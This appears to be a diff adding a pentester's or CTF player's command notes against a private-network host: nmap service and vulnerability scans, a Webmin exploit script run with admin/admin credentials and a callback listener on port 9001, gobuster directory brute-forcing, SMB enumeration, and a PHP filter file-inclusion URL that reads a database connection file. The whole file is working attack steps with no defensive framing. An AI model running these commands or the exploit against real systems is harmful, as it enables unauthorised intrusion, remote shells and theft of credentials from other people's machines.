@@ -1,0 +1,18 @@
+nmap 192.168.23.136 -sV -sC -Pn > nmap.txt
+nmap 192.168.23.136 -p- > nmapall.txt
+nmap -sU 192.168.23.136 > nmapuu.txxt
+
+nmap --script vuln -sV -p 18080,27017,28022,40873,54445 -Pn  192.168.23.136  > nmapvuln.txt
+
+
+python webmin_exploit.py --rhost 192.168.23.136 --lhost 192.168.19.23 -p admin -u admin -s True --lport 9001
+
+
+gobuster dir  -u http://192.168.23.136:40873  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt  -x txt,php,cgi -t50 > gobuster.txt
+gobuster dir  -u http://192.168.23.136:40873/admin/  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt  -x txt,php,cgi -t50 > gobuster.txt
+
+
+smbclient -L //192.168.23.136:54445
+
+
+http://webspellchecker.net:40873/index.php?page=php://filter/convert.base64-encode/resource=admin/db_connect HTTP/1.1
